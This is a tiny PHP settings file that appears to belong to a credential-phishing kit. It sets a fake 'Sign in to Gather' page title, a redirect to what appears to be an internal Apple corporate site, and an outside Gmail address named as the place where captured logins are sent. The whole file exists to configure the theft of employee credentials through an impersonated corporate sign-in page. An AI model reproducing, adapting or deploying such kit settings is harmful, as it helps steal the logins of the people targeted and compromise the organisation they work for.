<?php
    $logname = 'Sign in to Gather';
    $redidi = 'https://Gather.corp.apple.com';
   
   $emailstosend = 'aco.idesk@gmail.com';
   
   
   
?>